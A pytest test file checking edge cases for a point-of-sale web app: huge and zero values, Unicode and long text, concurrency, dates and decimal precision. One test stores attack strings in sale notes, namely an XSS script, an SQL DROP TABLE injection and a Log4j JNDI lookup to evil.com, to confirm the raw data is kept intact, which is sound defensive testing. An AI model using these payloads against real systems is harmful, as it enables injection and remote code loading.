"""
Comprehensive Edge Case and Boundary Tests for Sunnat Collection POS System.

Tests cover extreme scenarios including:
1. Maximum values (huge quantities, prices at max float)
2. Minimum values (zero, negative, empty)
3. Unicode and special characters in all text fields
4. Very long strings (10000+ characters)
5. Concurrent operations (simultaneous checkouts, stock updates)
6. Date boundaries (leap years, month ends, year 2038 problem)
7. Decimal precision issues (floating point errors)
8. Empty database scenarios
9. Database with millions of records (mocked)
10. Network timeouts and failures
"""

import pytest
import threading
import time
import sys
from datetime import datetime, date, timedelta
from decimal import Decimal, ROUND_HALF_UP, InvalidOperation
from unittest.mock import MagicMock, patch, PropertyMock
from concurrent.futures import ThreadPoolExecutor, as_completed
import json
import os

# Add the app directory to the path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from app import create_app
from app.models import (
    db, User, Product, Category, Customer, Sale, SaleItem, Payment,
    Location, LocationStock, StockMovement, StockTransfer, StockTransferItem,
    Supplier, PurchaseOrder, PurchaseOrderItem, DayClose
)


# =============================================================================
# FIXTURES
# =============================================================================

@pytest.fixture(scope='function')
def app():
    """Create application for testing."""
    app = create_app()
    app.config.update({
        'TESTING': True,
        'SQLALCHEMY_DATABASE_URI': 'sqlite:///:memory:',
        'WTF_CSRF_ENABLED': False,
        'SECRET_KEY': 'test-secret-key',
        'SQLALCHEMY_TRACK_MODIFICATIONS': False,
        'ITEMS_PER_PAGE': 20
    })
    return app


@pytest.fixture(scope='function')
def app_context(app):
    """Create an application context for each test."""
    with app.app_context():
        db.create_all()
        yield app
        db.session.rollback()
        db.drop_all()


@pytest.fixture(scope='function')
def session(app_context):
    """Create database session."""
    yield db.session


@pytest.fixture
def basic_setup(session):
    """Create basic entities for testing."""
    # Create category
    category = Category(name='Test Category', description='Test')
    session.add(category)
    session.flush()

    # Create warehouse location
    warehouse = Location(
        code='WH-001',
        name='Test Warehouse',
        location_type='warehouse',
        is_active=True
    )
    session.add(warehouse)
    session.flush()

    # Create kiosk location
    kiosk = Location(
        code='KS-001',
        name='Test Kiosk',
        location_type='kiosk',
        parent_warehouse_id=warehouse.id,
        is_active=True,
        can_sell=True
    )
    session.add(kiosk)
    session.flush()

    # Create user
    user = User(
        username='testuser',
        email='test@example.com',
        full_name='Test User',
        role='admin',
        location_id=kiosk.id,
        is_active=True
    )
    user.set_password('TestPass123!')
    session.add(user)
    session.flush()

    # Create product
    product = Product(
        code='PROD-001',
        name='Test Product',
        category_id=category.id,
        cost_price=Decimal('100.00'),
        selling_price=Decimal('150.00'),
        quantity=100,
        reorder_level=10,
        is_active=True
    )
    session.add(product)
    session.flush()

    # Create customer
    customer = Customer(
        name='Test Customer',
        phone='0300-1234567',
        email='customer@test.com',
        loyalty_points=0,
        is_active=True
    )
    session.add(customer)
    session.commit()

    return {
        'category': category,
        'warehouse': warehouse,
        'kiosk': kiosk,
        'user': user,
        'product': product,
        'customer': customer
    }


# =============================================================================
# 1. MAXIMUM VALUE TESTS
# =============================================================================

class TestMaximumValues:
    """Tests for maximum and extreme high values."""

    @pytest.mark.parametrize("quantity", [
        999999999,      # Near max 32-bit signed integer
        2147483647,     # Max 32-bit signed integer
        1000000000000,  # Trillion (if using BIGINT)
    ])
    def test_maximum_stock_quantity(self, session, basic_setup, quantity):
        """Test handling of very large stock quantities."""
        product = basic_setup['product']
        product.quantity = quantity
        session.commit()

        assert product.quantity == quantity

    @pytest.mark.parametrize("price", [
        Decimal('99999999.99'),          # Near DB limit for Numeric(10,2)
        Decimal('9999999.99'),           # Safely within Numeric(10,2)
        Decimal('999999.99'),
    ])
    def test_maximum_product_price(self, session, basic_setup, price):
        """Test handling of very high product prices."""
        product = basic_setup['product']
        product.selling_price = price
        product.cost_price = price - Decimal('10.00')
        session.commit()

        assert product.selling_price == price

    def test_maximum_cart_items_1000(self, session, basic_setup):
        """Test cart with 1000 items (stress test)."""
        user = basic_setup['user']
        customer = basic_setup['customer']
        kiosk = basic_setup['kiosk']
        category = basic_setup['category']

        # Create multiple products
        products = []
        for i in range(100):  # Create 100 products
            p = Product(
                code=f'PROD-MAX-{i:04d}',
                name=f'Max Product {i}',
                category_id=category.id,
                cost_price=Decimal('10.00'),
                selling_price=Decimal('20.00'),
                quantity=1000,
                is_active=True
            )
            session.add(p)
            products.append(p)
        session.flush()

        # Create sale with many items
        sale = Sale(
            sale_number='SALE-MAX-001',
            user_id=user.id,
            customer_id=customer.id,
            location_id=kiosk.id,
            subtotal=Decimal('0'),
            total=Decimal('0'),
            payment_method='cash',
            status='completed'
        )
        session.add(sale)
        session.flush()

        # Add 1000 items (10 of each product)
        total = Decimal('0')
        for product in products:
            for qty in range(10):
                item = SaleItem(
                    sale_id=sale.id,
                    product_id=product.id,
                    quantity=1,
                    unit_price=product.selling_price,
                    discount=Decimal('0'),
                    subtotal=product.selling_price
                )
                session.add(item)
                total += product.selling_price

        sale.subtotal = total
        sale.total = total
        session.commit()

        # Verify
        assert sale.items.count() == 1000
        assert sale.total == Decimal('20000.00')  # 1000 items at 20.00 each

    def test_maximum_loyalty_points(self, session, basic_setup):
        """Test handling of maximum loyalty points."""
        customer = basic_setup['customer']
        max_points = 2147483647  # Max 32-bit integer

        customer.loyalty_points = max_points
        session.commit()

        assert customer.loyalty_points == max_points
        assert customer.loyalty_tier == 'Platinum'
        assert customer.points_to_next_tier == 0

    def test_price_overflow_protection(self, session, basic_setup):
        """Test that sale total doesn't overflow with many expensive items."""
        product = basic_setup['product']
        product.selling_price = Decimal('9999999.99')
        session.commit()

        user = basic_setup['user']
        customer = basic_setup['customer']
        kiosk = basic_setup['kiosk']

        sale = Sale(
            sale_number='SALE-OVERFLOW-001',
            user_id=user.id,
            customer_id=customer.id,
            location_id=kiosk.id,
            subtotal=Decimal('0'),
            total=Decimal('0'),
            payment_method='cash',
            status='completed'
        )
        session.add(sale)
        session.flush()

        # Add 100 expensive items
        for i in range(100):
            item = SaleItem(
                sale_id=sale.id,
                product_id=product.id,
                quantity=1,
                unit_price=product.selling_price,
                discount=Decimal('0'),
                subtotal=product.selling_price
            )
            session.add(item)

        # Calculate totals - this should handle large numbers
        sale.calculate_totals()
        session.commit()

        # Verify calculation doesn't overflow
        expected_total = Decimal('9999999.99') * 100
        assert sale.subtotal == expected_total


# =============================================================================
# 2. MINIMUM VALUE TESTS
# =============================================================================

class TestMinimumValues:
    """Tests for minimum, zero, negative, and empty values."""

    def test_checkout_with_zero_quantity(self, session, basic_setup):
        """Test handling of zero quantity in checkout."""
        sale = Sale(
            sale_number='SALE-ZERO-001',
            user_id=basic_setup['user'].id,
            customer_id=basic_setup['customer'].id,
            location_id=basic_setup['kiosk'].id,
            subtotal=Decimal('0'),
            total=Decimal('0'),
            payment_method='cash',
            status='completed'
        )
        session.add(sale)
        session.flush()

        # Add item with zero quantity
        item = SaleItem(
            sale_id=sale.id,
            product_id=basic_setup['product'].id,
            quantity=0,
            unit_price=Decimal('100.00'),
            discount=Decimal('0'),
            subtotal=Decimal('0')
        )
        session.add(item)
        session.commit()

        item.calculate_subtotal()
        assert item.subtotal == Decimal('0')

    @pytest.mark.parametrize("quantity", [
        Decimal('0.001'),   # Very small fractional
        Decimal('0.01'),    # Penny equivalent
        Decimal('0.1'),     # Dime equivalent
        1,                  # Minimum valid quantity
    ])
    def test_checkout_with_fractional_quantity(self, session, basic_setup, quantity):
        """Test checkout with very small quantities (for weight-based products)."""
        product = basic_setup['product']

        sale = Sale(
            sale_number=f'SALE-FRAC-{str(quantity).replace(".", "")}',
            user_id=basic_setup['user'].id,
            customer_id=basic_setup['customer'].id,
            location_id=basic_setup['kiosk'].id,
            subtotal=Decimal('0'),
            total=Decimal('0'),
            payment_method='cash',
            status='completed'
        )
        session.add(sale)
        session.flush()

        # Note: SaleItem uses Integer for quantity, so this tests boundaries
        qty_int = int(quantity) if quantity >= 1 else 1
        subtotal = Decimal(str(qty_int)) * product.selling_price

        item = SaleItem(
            sale_id=sale.id,
            product_id=product.id,
            quantity=qty_int,
            unit_price=product.selling_price,
            discount=Decimal('0'),
            subtotal=subtotal
        )
        session.add(item)
        session.commit()

        assert item.subtotal >= Decimal('0')

    def test_zero_price_product(self, session, basic_setup):
        """Test product with zero price (promotional/free)."""
        category = basic_setup['category']

        free_product = Product(
            code='PROD-FREE-001',
            name='Free Sample',
            category_id=category.id,
            cost_price=Decimal('0.00'),
            selling_price=Decimal('0.00'),
            quantity=100,
            is_active=True
        )
        session.add(free_product)
        session.commit()

        assert free_product.cost_price == Decimal('0.00')
        assert free_product.selling_price == Decimal('0.00')
        # Profit margin should handle division by zero
        assert free_product.profit_margin == 0

    def test_negative_stock_prevention(self, session, basic_setup):
        """Test that stock cannot go negative through normal operations."""
        kiosk = basic_setup['kiosk']
        product = basic_setup['product']

        # Create location stock with small quantity
        location_stock = LocationStock(
            location_id=kiosk.id,
            product_id=product.id,
            quantity=5,
            reserved_quantity=0,
            reorder_level=10
        )
        session.add(location_stock)
        session.commit()

        # Available should be 5
        assert location_stock.available_quantity == 5

        # If reserved exceeds quantity, available should be 0 (not negative)
        location_stock.reserved_quantity = 10
        session.commit()

        assert location_stock.available_quantity == 0

    def test_empty_cart_sale(self, session, basic_setup):
        """Test creating a sale with no items."""
        sale = Sale(
            sale_number='SALE-EMPTY-001',
            user_id=basic_setup['user'].id,
            customer_id=None,  # Walk-in customer
            location_id=basic_setup['kiosk'].id,
            subtotal=Decimal('0'),
            total=Decimal('0'),
            payment_method='cash',
            status='completed'
        )
        session.add(sale)
        session.commit()

        # Empty sale should have zero totals
        assert sale.subtotal == Decimal('0')
        assert sale.total == Decimal('0')
        assert sale.items.count() == 0

    def test_zero_loyalty_points_redemption(self, session, basic_setup):
        """Test attempting to redeem zero loyalty points."""
        customer = basic_setup['customer']
        customer.loyalty_points = 500
        session.commit()

        # Attempt to redeem 0 points (should fail minimum requirement)
        success, result = customer.redeem_points(0)
        assert success is False
        assert '100 points' in result

    def test_empty_customer_fields(self, session):
        """Test customer with empty optional fields."""
        customer = Customer(
            name='Minimal Customer',
            phone='0300-0000000',
            email='',
            address='',
            city='',
            notes=''
        )
        session.add(customer)
        session.commit()

        assert customer.id is not None
        assert customer.email == ''


# =============================================================================
# 3. UNICODE AND SPECIAL CHARACTERS TESTS
# =============================================================================

class TestUnicodeAndSpecialCharacters:
    """Tests for Unicode, emojis, RTL text, and special characters."""

    @pytest.mark.parametrize("name,expected", [
        # Arabic text (RTL)
        ('عطر العود الفاخر', 'عطر العود الفاخر'),
        # Urdu text
        ('سنت کلیکشن عطر', 'سنت کلیکشن عطر'),
        # Chinese characters
        ('阿拉伯香水', '阿拉伯香水'),
        # Japanese
        ('アラビアの香水', 'アラビアの香水'),
        # Korean
        ('아라비아 향수', '아라비아 향수'),
        # Mixed script
        ('Attar عطر 香水', 'Attar عطر 香水'),
        # With diacritics
        ('Parfum francais avec accents: e acute: e grave: e', 'Parfum francais avec accents: e acute: e grave: e'),
    ])
    def test_unicode_product_names(self, session, basic_setup, name, expected):
        """Test products with Unicode names from various languages."""
        category = basic_setup['category']

        product = Product(
            code=f'PROD-UNI-{hash(name) % 10000:04d}',
            name=name,
            category_id=category.id,
            cost_price=Decimal('100.00'),
            selling_price=Decimal('150.00'),
            quantity=10,
            is_active=True
        )
        session.add(product)
        session.commit()

        retrieved = Product.query.get(product.id)
        assert retrieved.name == expected

    @pytest.mark.parametrize("name", [
        'Test Product',          # emoji in name
        'Premium Attar',         # sparkles
        'Gift Set',              # gift emoji
        'Special Arabic Attar',  # multiple emojis
    ])
    def test_emoji_in_product_names(self, session, basic_setup, name):
        """Test products with emojis in names."""
        category = basic_setup['category']

        product = Product(
            code=f'PROD-EMO-{hash(name) % 10000:04d}',
            name=name,
            category_id=category.id,
            cost_price=Decimal('100.00'),
            selling_price=Decimal('150.00'),
            quantity=10,
            is_active=True
        )
        session.add(product)
        session.commit()

        retrieved = Product.query.get(product.id)
        assert retrieved.name == name

    def test_rtl_text_in_customer_address(self, session):
        """Test RTL (Arabic/Urdu) text in customer address."""
        arabic_address = 'شارع الملك فهد، الرياض، المملكة العربية السعودية'
        urdu_address = 'وہ کینٹ، پاکستان'

        customer = Customer(
            name='محمد علی',
            phone='0300-9999999',
            address=arabic_address,
            city=urdu_address
        )
        session.add(customer)
        session.commit()

        retrieved = Customer.query.get(customer.id)
        assert retrieved.address == arabic_address
        assert retrieved.city == urdu_address

    @pytest.mark.parametrize("special_chars", [
        '<script>alert("XSS")</script>',     # XSS attempt
        "'; DROP TABLE products; --",         # SQL injection attempt
        '\\x00\\x01\\x02',                    # Null bytes
        '\n\r\t',                              # Control characters
        '& < > " \'',                          # HTML entities
        '${jndi:ldap://evil.com/a}',          # Log4j-style attack
    ])
    def test_special_characters_in_notes(self, session, basic_setup, special_chars):
        """Test handling of potentially dangerous special characters."""
        sale = Sale(
            sale_number='SALE-SPEC-001',
            user_id=basic_setup['user'].id,
            customer_id=basic_setup['customer'].id,
            location_id=basic_setup['kiosk'].id,
            subtotal=Decimal('100.00'),
            total=Decimal('100.00'),
            payment_method='cash',
            notes=special_chars,  # Store potentially dangerous input
            status='completed'
        )
        session.add(sale)
        session.commit()

        # Should store the raw data (sanitization should happen at display/output)
        retrieved = Sale.query.get(sale.id)
        assert retrieved.notes == special_chars

    def test_mixed_unicode_and_numbers(self, session, basic_setup):
        """Test product with mixed Unicode text and numbers."""
        product = Product(
            code='PROD-MIX-001',
            name='عطر 100ml Premium عود 24K Gold Edition',
            description='وصف المنتج: Premium quality attar with 24 karat gold flakes',
            category_id=basic_setup['category'].id,
            cost_price=Decimal('500.00'),
            selling_price=Decimal('999.99'),
            quantity=50,
            size='100ml',
            is_active=True
        )
        session.add(product)
        session.commit()

        retrieved = Product.query.get(product.id)
        assert '100ml' in retrieved.name
        assert '24K' in retrieved.name


# =============================================================================
# 4. VERY LONG STRING TESTS
# =============================================================================

class TestVeryLongStrings:
    """Tests for extremely long string inputs."""

    def test_10000_character_product_description(self, session, basic_setup):
        """Test product with 10000+ character description."""
        long_description = 'A' * 10000 + ' This is a very long product description. ' * 100

        product = Product(
            code='PROD-LONG-001',
            name='Product with Long Description',
            description=long_description,
            category_id=basic_setup['category'].id,
            cost_price=Decimal('100.00'),
            selling_price=Decimal('150.00'),
            quantity=10,
            is_active=True
        )
        session.add(product)
        session.commit()

        retrieved = Product.query.get(product.id)
        assert len(retrieved.description) > 10000

    def test_very_long_customer_notes(self, session):
        """Test customer with extremely long notes field."""
        long_notes = 'Customer note: ' + 'x' * 15000

        customer = Customer(
            name='Long Notes Customer',
            phone='0300-8888888',
            notes=long_notes
        )
        session.add(customer)
        session.commit()

        retrieved = Customer.query.get(customer.id)
        assert len(retrieved.notes) > 10000

    def test_very_long_sale_notes(self, session, basic_setup):
        """Test sale with very long notes."""
        long_notes = 'Sale notes: ' + 'Details ' * 2000

        sale = Sale(
            sale_number='SALE-LONG-001',
            user_id=basic_setup['user'].id,
            customer_id=basic_setup['customer'].id,
            location_id=basic_setup['kiosk'].id,
            subtotal=Decimal('100.00'),
            total=Decimal('100.00'),
            payment_method='cash',
            notes=long_notes,
            status='completed'
        )
        session.add(sale)
        session.commit()

        retrieved = Sale.query.get(sale.id)
        assert len(retrieved.notes) > 10000

    def test_long_address_fields(self, session):
        """Test customer with very long address."""
        long_address = 'Building ' + 'A' * 500 + ', Street ' + 'B' * 500 + ', City Name ' * 50

        customer = Customer(
            name='Long Address Customer',
            phone='0300-7777777',
            address=long_address
        )
        session.add(customer)
        session.commit()

        retrieved = Customer.query.get(customer.id)
        assert retrieved.address is not None


# =============================================================================
# 5. CONCURRENT OPERATIONS TESTS
# =============================================================================

class TestConcurrentOperations:
    """Tests for concurrent operations and race conditions."""

    def test_concurrent_stock_deductions(self, app):
        """Test simultaneous stock deductions from multiple threads."""
        results = []
        errors = []

        def deduct_stock(app, product_id, location_id, quantity, thread_id):
            """Deduct stock in a separate thread."""
            with app.app_context():
                try:
                    stock = LocationStock.query.filter_by(
                        product_id=product_id,
                        location_id=location_id
                    ).first()

                    if stock and stock.quantity >= quantity:
                        stock.quantity -= quantity
                        db.session.commit()
                        results.append(('success', thread_id, quantity))
                    else:
                        results.append(('insufficient', thread_id, 0))
                except Exception as e:
                    db.session.rollback()
                    errors.append((thread_id, str(e)))

        with app.app_context():
            db.create_all()

            # Create test data
            category = Category(name='Concurrent Test', description='Test')
            db.session.add(category)
            db.session.flush()

            location = Location(
                code='LOC-CONC-001',
                name='Concurrent Test Location',
                location_type='kiosk',
                is_active=True
            )
            db.session.add(location)
            db.session.flush()

            product = Product(
                code='PROD-CONC-001',
                name='Concurrent Test Product',
                category_id=category.id,
                cost_price=Decimal('100.00'),
                selling_price=Decimal('150.00'),
                quantity=100,
                is_active=True
            )
            db.session.add(product)
            db.session.flush()

            # Stock with limited quantity
            stock = LocationStock(
                location_id=location.id,
                product_id=product.id,
                quantity=50  # Only 50 available
            )
            db.session.add(stock)
            db.session.commit()

            product_id = product.id
            location_id = location.id

        # Create threads trying to deduct more than available
        threads = []
        for i in range(10):
            t = threading.Thread(
                target=deduct_stock,
                args=(app, product_id, location_id, 10, i)
            )
            threads.append(t)

        # Start all threads
        for t in threads:
            t.start()

        # Wait for all to complete
        for t in threads:
            t.join()

        # Verify: Total deducted should not exceed 50
        # Note: Without proper locking, this might fail
        with app.app_context():
            stock = LocationStock.query.filter_by(
                product_id=product_id,
                location_id=location_id
            ).first()
            # Stock should not be negative
            assert stock.quantity >= 0

    def test_concurrent_sale_number_generation(self, app):
        """Test that sale numbers are unique under concurrent generation."""
        sale_numbers = []
        lock = threading.Lock()

        def create_sale(app, index):
            """Create a sale in a separate thread."""
            with app.app_context():
                # Generate unique sale number
                from app.utils.helpers import generate_sale_number
                sale_number = generate_sale_number()

                with lock:
                    sale_numbers.append(sale_number)

        with app.app_context():
            db.create_all()

        threads = []
        for i in range(20):
            t = threading.Thread(target=create_sale, args=(app, i))
            threads.append(t)

        for t in threads:
            t.start()

        for t in threads:
            t.join()

        # All sale numbers should be unique
        assert len(sale_numbers) == len(set(sale_numbers))

    def test_stock_transfer_exact_available(self, session, basic_setup):
        """Test stock transfer of exactly the available amount."""
        kiosk = basic_setup['kiosk']
        warehouse = basic_setup['warehouse']
        product = basic_setup['product']
        user = basic_setup['user']

        # Create warehouse stock with exact amount
        warehouse_stock = LocationStock(
            location_id=warehouse.id,
            product_id=product.id,
            quantity=50,
            reserved_quantity=0
        )
        session.add(warehouse_stock)
        session.commit()

        # Create transfer for exact amount
        transfer = StockTransfer(
            transfer_number='TRF-EXACT-001',
            source_location_id=warehouse.id,
            destination_location_id=kiosk.id,
            status='requested',
            requested_by=user.id
        )
        session.add(transfer)
        session.flush()

        # Transfer exact available amount
        item = StockTransferItem(
            transfer_id=transfer.id,
            product_id=product.id,
            quantity_requested=50  # Exactly available
        )
        session.add(item)
        session.commit()

        # Verify
        assert item.quantity_requested == warehouse_stock.quantity


# =============================================================================
# 6. DATE BOUNDARY TESTS
# =============================================================================

class TestDateBoundaries:
    """Tests for date edge cases including leap years and Y2038."""

    def test_leap_year_feb_29_2024(self, session, basic_setup):
        """Test sale on February 29, 2024 (leap year)."""
        leap_date = datetime(2024, 2, 29, 12, 0, 0)

        sale = Sale(
            sale_number='SALE-LEAP-2024',
            user_id=basic_setup['user'].id,
            customer_id=basic_setup['customer'].id,
            location_id=basic_setup['kiosk'].id,
            subtotal=Decimal('100.00'),
            total=Decimal('100.00'),
            payment_method='cash',
            sale_date=leap_date,
            status='completed'
        )
        session.add(sale)
        session.commit()

        retrieved = Sale.query.get(sale.id)
        assert retrieved.sale_date.month == 2
        assert retrieved.sale_date.day == 29

    def test_year_2038_problem(self, session, basic_setup):
        """Test dates near and beyond Unix timestamp overflow (Jan 19, 2038)."""
        # Just before Y2038
        near_2038 = datetime(2038, 1, 18, 23, 59, 59)

        sale = Sale(
            sale_number='SALE-2038-NEAR',
            user_id=basic_setup['user'].id,
            customer_id=basic_setup['customer'].id,
            location_id=basic_setup['kiosk'].id,
            subtotal=Decimal('100.00'),
            total=Decimal('100.00'),
            payment_method='cash',
            sale_date=near_2038,
            status='completed'
        )
        session.add(sale)
        session.commit()

        retrieved = Sale.query.get(sale.id)
        assert retrieved.sale_date.year == 2038

    @pytest.mark.parametrize("test_date", [
        datetime(2024, 12, 31, 23, 59, 59),  # End of year
        datetime(2025, 1, 1, 0, 0, 0),        # Start of year
        datetime(2024, 6, 30, 23, 59, 59),    # End of Q2
        datetime(2024, 3, 31, 23, 59, 59),    # End of March
    ])
    def test_month_end_sales(self, session, basic_setup, test_date):
        """Test sales on month-end boundaries."""
        sale = Sale(
            sale_number=f'SALE-ME-{test_date.strftime("%Y%m%d%H%M%S")}',
            user_id=basic_setup['user'].id,
            customer_id=basic_setup['customer'].id,
            location_id=basic_setup['kiosk'].id,
            subtotal=Decimal('100.00'),
            total=Decimal('100.00'),
            payment_method='cash',
            sale_date=test_date,
            status='completed'
        )
        session.add(sale)
        session.commit()

        retrieved = Sale.query.get(sale.id)
        assert retrieved.sale_date == test_date

    def test_product_expiry_date_boundaries(self, session, basic_setup):
        """Test product expiry date edge cases."""
        category = basic_setup['category']

        # Already expired
        expired = Product(
            code='PROD-EXP-001',
            name='Expired Product',
            category_id=category.id,
            cost_price=Decimal('100.00'),
            selling_price=Decimal('150.00'),
            quantity=10,
            expiry_date=date.today() - timedelta(days=1),
            is_active=True
        )
        session.add(expired)

        # Expires today
        expires_today = Product(
            code='PROD-EXP-002',
            name='Expires Today',
            category_id=category.id,
            cost_price=Decimal('100.00'),
            selling_price=Decimal('150.00'),
            quantity=10,
            expiry_date=date.today(),
            is_active=True
        )
        session.add(expires_today)

        # Expiring in 7 days (critical)
        expiring_soon = Product(
            code='PROD-EXP-003',
            name='Expiring Critical',
            category_id=category.id,
            cost_price=Decimal('100.00'),
            selling_price=Decimal('150.00'),
            quantity=10,
            expiry_date=date.today() + timedelta(days=7),
            is_active=True
        )
        session.add(expiring_soon)
        session.commit()

        assert expired.is_expired is True
        assert expired.expiry_status == 'expired'

        # Today is the expiry date - product is not yet expired (expires at end of day)
        assert expires_today.is_expired is False

        assert expiring_soon.is_expiring_critical is True
        assert expiring_soon.expiry_status == 'critical'

    def test_customer_birthday_today(self, session):
        """Test customer birthday detection for today."""
        today = date.today()

        customer = Customer(
            name='Birthday Customer',
            phone='0300-6666666',
            birthday=date(1990, today.month, today.day)  # Same month/day as today
        )
        session.add(customer)
        session.commit()

        # Check if birthday detection works
        is_birthday = (
            customer.birthday.month == today.month and
            customer.birthday.day == today.day
        )
        assert is_birthday is True


# =============================================================================
# 7. DECIMAL PRECISION TESTS
# =============================================================================

class TestDecimalPrecision:
    """Tests for decimal precision and floating point issues."""

    @pytest.mark.parametrize("price,quantity,expected_subtotal", [
        (Decimal('0.01'), 1, Decimal('0.01')),           # Minimum price
        (Decimal('0.001'), 1000, Decimal('1.00')),       # Sub-cent calculation
        (Decimal('33.33'), 3, Decimal('99.99')),         # Non-terminating decimal
        (Decimal('0.10'), 3, Decimal('0.30')),           # Classic floating point issue
        (Decimal('19.99'), 7, Decimal('139.93')),        # Common retail price
    ])
    def test_decimal_multiplication_precision(self, session, basic_setup, price, quantity, expected_subtotal):
        """Test that decimal multiplication maintains precision."""
        sale = Sale(
            sale_number=f'SALE-DEC-{hash((price, quantity)) % 10000:04d}',
            user_id=basic_setup['user'].id,
            customer_id=basic_setup['customer'].id,
            location_id=basic_setup['kiosk'].id,
            subtotal=Decimal('0'),
            total=Decimal('0'),
            payment_method='cash',
            status='completed'
        )
        session.add(sale)
        session.flush()

        item = SaleItem(
            sale_id=sale.id,
            product_id=basic_setup['product'].id,
            quantity=quantity,
            unit_price=price,
            discount=Decimal('0')
        )
        item.calculate_subtotal()
        session.add(item)
        session.commit()

        # Use quantize for comparison to handle precision
        calculated = item.subtotal.quantize(Decimal('0.01'), rounding=ROUND_HALF_UP)
        expected = expected_subtotal.quantize(Decimal('0.01'), rounding=ROUND_HALF_UP)
        assert calculated == expected

    def test_floating_point_error_avoidance(self, session, basic_setup):
        """Test that 0.1 + 0.2 = 0.3 (which fails with float)."""
        # With floats: 0.1 + 0.2 = 0.30000000000000004
        # With Decimal: 0.1 + 0.2 = 0.3

        price1 = Decimal('0.1')
        price2 = Decimal('0.2')
        expected = Decimal('0.3')

        total = price1 + price2
        assert total == expected

    def test_discount_calculation_precision(self, session, basic_setup):
        """Test discount calculations maintain precision."""
        sale = Sale(
            sale_number='SALE-DISC-PREC-001',
            user_id=basic_setup['user'].id,
            customer_id=basic_setup['customer'].id,
            location_id=basic_setup['kiosk'].id,
            subtotal=Decimal('100.00'),
            discount=Decimal('15.00'),
            discount_type='percentage',
            tax=Decimal('0'),
            total=Decimal('0'),
            payment_method='cash',
            status='completed'
        )
        session.add(sale)
        session.flush()

        # Add item
        item = SaleItem(
            sale_id=sale.id,
            product_id=basic_setup['product'].id,
            quantity=1,
            unit_price=Decimal('100.00'),
            discount=Decimal('0'),
            subtotal=Decimal('100.00')
        )
        session.add(item)
        session.commit()

        # Calculate totals
        sale.calculate_totals()
        session.commit()

        # 15% of 100.00 = 15.00, total should be 85.00
        assert sale.total == Decimal('85.00')

    def test_large_decimal_operations(self, session, basic_setup):
        """Test operations with large decimal values."""
        large_value = Decimal('9999999.99')

        product = basic_setup['product']
        product.cost_price = large_value - Decimal('1000.00')
        product.selling_price = large_value
        session.commit()

        # Calculate profit margin
        margin = product.profit_margin
        assert margin > 0

    def test_rounding_in_tax_calculation(self, session, basic_setup):
        """Test tax calculation rounding."""
        sale = Sale(
            sale_number='SALE-TAX-001',
            user_id=basic_setup['user'].id,
            customer_id=basic_setup['customer'].id,
            location_id=basic_setup['kiosk'].id,
            subtotal=Decimal('99.99'),
            discount=Decimal('0'),
            discount_type='amount',
            tax=Decimal('17'),  # 17% tax
            total=Decimal('0'),
            payment_method='cash',
            status='completed'
        )
        session.add(sale)
        session.flush()

        item = SaleItem(
            sale_id=sale.id,
            product_id=basic_setup['product'].id,
            quantity=1,
            unit_price=Decimal('99.99'),
            discount=Decimal('0'),
            subtotal=Decimal('99.99')
        )
        session.add(item)
        session.commit()

        sale.calculate_totals()
        session.commit()

        # Tax: 99.99 * 0.17 = 16.9983 -> rounds to 17.00
        # Total: 99.99 + 17.00 = 116.99
        assert sale.total > sale.subtotal


# =============================================================================
# 8. EMPTY DATABASE SCENARIOS
# =============================================================================

class TestEmptyDatabase:
    """Tests for operations on empty database."""

    def test_search_products_empty_db(self, session):
        """Test product search on empty database."""
        products = Product.query.filter(
            Product.name.ilike('%test%')
        ).all()
        assert products == []

    def test_sales_list_empty_db(self, session):
        """Test sales listing on empty database."""
        sales = Sale.query.all()
        assert sales == []

    def test_customers_list_empty_db(self, session):
        """Test customer listing on empty database."""
        customers = Customer.query.all()
        assert customers == []

    def test_reports_empty_db(self, session):
        """Test generating reports on empty database."""
        from datetime import date

        today = date.today()

        # Get sales for today (should be empty)
        today_sales = Sale.query.filter(
            db.func.date(Sale.sale_date) == today
        ).all()

        assert today_sales == []

        # Calculate totals (should be 0)
        total_sales = len(today_sales)
        total_revenue = sum(sale.total for sale in today_sales)

        assert total_sales == 0
        assert total_revenue == 0

    def test_low_stock_alert_empty_db(self, session):
        """Test low stock alert on empty database."""
        low_stock = Product.query.filter(
            Product.quantity <= Product.reorder_level
        ).all()
        assert low_stock == []


# =============================================================================
# 9. MOCK LARGE DATABASE TESTS
# =============================================================================

class TestLargeDatabaseMock:
    """Tests simulating large database scenarios."""

    def test_mock_million_products_query(self, session, basic_setup):
        """Mock test for querying from database with millions of products."""
        category = basic_setup['category']

        # Create some products to test pagination
        for i in range(100):
            product = Product(
                code=f'PROD-LARGE-{i:06d}',
                name=f'Large DB Product {i}',
                category_id=category.id,
                cost_price=Decimal('100.00'),
                selling_price=Decimal('150.00'),
                quantity=100,
                is_active=True
            )
            session.add(product)
        session.commit()

        # Test pagination
        page_1 = Product.query.limit(20).offset(0).all()
        page_2 = Product.query.limit(20).offset(20).all()

        assert len(page_1) == 20
        assert len(page_2) == 20
        assert page_1[0].id != page_2[0].id

    def test_mock_high_volume_sales(self, session, basic_setup):
        """Mock test for high volume sales scenario."""
        user = basic_setup['user']
        product = basic_setup['product']
        kiosk = basic_setup['kiosk']

        # Create many sales quickly
        for i in range(50):
            sale = Sale(
                sale_number=f'SALE-HV-{i:06d}',
                user_id=user.id,
                location_id=kiosk.id,
                subtotal=Decimal('100.00'),
                total=Decimal('100.00'),
                payment_method='cash',
                status='completed'
            )
            session.add(sale)
        session.commit()

        # Verify all created
        count = Sale.query.count()
        assert count == 50

    def test_index_performance_simulation(self, session, basic_setup):
        """Simulate indexed field queries."""
        category = basic_setup['category']

        # Create products with varied codes
        for i in range(50):
            product = Product(
                code=f'IDX-{i:06d}',
                barcode=f'123456789{i:04d}',
                name=f'Index Test Product {i}',
                category_id=category.id,
                cost_price=Decimal('100.00'),
                selling_price=Decimal('150.00'),
                quantity=100,
                is_active=True
            )
            session.add(product)
        session.commit()

        # Query by indexed field (code)
        result = Product.query.filter_by(code='IDX-000025').first()
        assert result is not None
        assert result.code == 'IDX-000025'

        # Query by indexed field (barcode)
        result = Product.query.filter_by(barcode='1234567890025').first()
        assert result is not None


# =============================================================================
# 10. NETWORK TIMEOUT AND FAILURE SIMULATION
# =============================================================================

class TestNetworkFailures:
    """Tests simulating network timeouts and failures."""

    def test_database_connection_retry(self, session, basic_setup):
        """Test handling of database connection issues."""
        # Simulate a simple operation that could fail
        try:
            product = basic_setup['product']
            product.name = 'Updated Name'
            session.commit()
            success = True
        except Exception:
            session.rollback()
            success = False

        assert success is True

    @patch('app.models.db.session.commit')
